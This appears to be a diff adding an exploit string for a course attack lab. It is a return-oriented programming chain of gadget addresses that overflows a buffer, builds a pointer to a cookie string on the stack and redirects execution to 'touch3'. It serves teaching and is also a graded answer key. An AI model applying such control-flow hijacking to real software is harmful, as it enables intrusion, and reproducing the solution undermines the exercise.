@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00 /* 24 bytes of padding to set return address in proper place. */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c4 1a 40 00 00 00 00 00 /* movq rsp rax */
+e5 19 40 00 00 00 00 00 /* movq rax rdi */
+d7 19 40 00 00 00 00 00 /* popq rax */
+48 00 00 00 00 00 00 00 /* 0x48 bytes of instruction is needed to reach address of stack top. */
+53 1a 40 00 00 00 00 00 /* movl eax ecx */
+15 1a 40 00 00 00 00 00 /* movl ecx edx */
+8f 1a 40 00 00 00 00 00 /* movl edx esi */
+fb 19 40 00 00 00 00 00 /* (%rdi,%rsi,1),%rax */
+e5 19 40 00 00 00 00 00 /* movq rax rdi */
+2d 19 40 00 00 00 00 00 /* adres touch3 */
+37 30 31 38 37 31 39 36 /* cookie */
